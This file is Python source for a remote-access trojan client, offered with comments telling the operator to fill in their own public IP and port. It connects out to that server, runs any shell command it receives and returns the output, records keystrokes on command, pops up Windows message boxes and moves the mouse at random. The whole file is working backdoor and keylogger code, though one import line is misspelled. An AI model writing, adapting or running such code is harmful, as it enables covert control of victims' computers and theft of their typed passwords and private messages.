import socket
import pyautogui
import random
from threading import Timer
import os
import subprocess
from pynput.keyboard import Listener, Key
import ctypes
form sys import exit

HEADER = 8192
PORT = 0  # Replace 0 With Your Port Number
SERVER = "localhost"  # Replace localhost With Your Public IP
clientnum = "client_name"  # Replace client_name With Any Name You Haven't Used Before, No Spaces
FORMAT = 'utf-8'
ADDR = (SERVER, PORT)
kloutput = []
line = ""
output = ""

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    client.connect(ADDR)
except:
    exit()


def message_box(tit, txt, st):
    return ctypes.windll.user32.MessageBoxW(0, txt, tit, st)


def log_keystroke(key):
    key = str(key).replace("'", "")
    global line
    global output
    global kloutput

    if key in "abcdefghijklmnopqrstuvwxyz":
        line += key

    if key not in "abcdefghijklmnopqrstuvwxyz":
        if line:
            kloutput.append(line)
            line = ""
        if key:
            kloutput.append(key)
        output = "<kl>" + str(kloutput)


def random_mouse():
    for z in range(1, 10):
        x = random.randint(0, 1000)
        y = random.randint(0, 1000)
        pyautogui.moveTo(x, y)


def send(msg):
    message = msg.encode(FORMAT)
    client.send(message)


def recieve():
    recieved = (client.recv(HEADER))
    result = recieved.decode(FORMAT)
    return result


try:
    send(clientnum + "<?CLIENT?>")
    while True:
        command = recieve()
        cwd = ""
        output = ""
        if command:
            if "cd" in command.split():
                try:
                    if len(command.split()) == 2:
                        os.chdir(command.split()[1])
                    else:
                        output = os.getcwd()
                except FileNotFoundError as e:
                    output = e
            if "kl" in command.split():
                try:
                    if len(command.split()) == 2:
                        kl, time = command.split()
                        time = int(time)
                        command = ""
                    else:
                        time = 0
                        output = "Usage: kl <time in seconds>"
                        command = ""
                    with Listener(on_press=log_keystroke) as l:
                        Timer(time, l.stop).start()
                        l.join()
                except ValueError as e:
                    output = "Usage: kl <time in seconds>"
                    command = ""
            if "mb" in command.split():
                try:
                    mb, title, text, style = command.split()
                    message_box(title, text, style)
                    command = ""
                except:
                    output = "Usage: mb <title> <text> <style 0-6>"
                    command = ""
            if "rm" in command.split():
                random_mouse()
                command = ""
            if "close client" in command:
                exit()
            else:
                if command:
                    output = subprocess.getoutput(command)
            cwd = os.getcwd()
            output = str(output)
            send(clientnum + "<?CLIENT?>" + output + "<sep>" + cwd)
            output = ""
except:
    exit()
